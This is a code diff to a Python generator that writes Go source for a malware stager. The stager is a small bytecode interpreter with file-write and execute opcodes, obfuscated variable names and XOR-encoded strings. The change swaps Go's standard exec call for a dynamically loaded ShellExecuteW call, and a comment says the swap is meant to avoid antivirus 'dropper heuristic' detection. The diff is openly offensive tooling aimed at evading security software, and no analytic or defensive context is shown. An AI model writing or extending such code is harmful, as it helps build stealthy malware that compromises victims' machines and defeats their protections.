@@ -459,11 +459,12 @@ def generate_stager_source(asm, bytecode, sandbox=True):
     add('\t"io"')
     add('\t"net/http"')
     add('\t"os"')
-    add('\t"os/exec"')
     add('\t"path/filepath"')
     if sandbox:
         add('\t"runtime"')
+    add('\t"syscall"')
     add('\t"time"')
+    add('\t"unsafe"')
     add(")")
     add("")
 
@@ -618,11 +619,14 @@ def generate_stager_source(asm, bytecode, sandbox=True):
     ]
     cases.append((asm.OP_WFILE, wfile_lines))
 
-    # -- EXEC via os/exec.Command (standard library, no dynamic DLL loading) --
-    vCmd = rand_id(2, 4)
+    # -- EXEC via ShellExecuteW (no os/exec import — avoids dropper heuristic) --
+    vSh, vSe, vVb, vFl = unique_ids(4, 2, 5)
     exec_lines = [
-        f"\t\t\t{vCmd} := exec.Command(string({vm_stk}[{vm_sp}-1]))",
-        f"\t\t\t{vCmd}.Start()",
+        f"\t\t\t{vSh} := syscall.NewLazyDLL({fn_dec}([]byte{B}{enc_str('shell32.dll')}{E}, 0x{str_key:02x}))",
+        f"\t\t\t{vSe} := {vSh}.NewProc({fn_dec}([]byte{B}{enc_str('ShellExecuteW')}{E}, 0x{str_key:02x}))",
+        f"\t\t\t{vVb}, _ := syscall.UTF16PtrFromString({fn_dec}([]byte{B}{enc_str('open')}{E}, 0x{str_key:02x}))",
+        f"\t\t\t{vFl}, _ := syscall.UTF16PtrFromString(string({vm_stk}[{vm_sp}-1]))",
+        f"\t\t\t{vSe}.Call(0, uintptr(unsafe.Pointer({vVb})), uintptr(unsafe.Pointer({vFl})), 0, 0, 0)",
         f"\t\t\t{vm_sp}--",
     ]
     cases.append((asm.OP_EXEC, exec_lines))
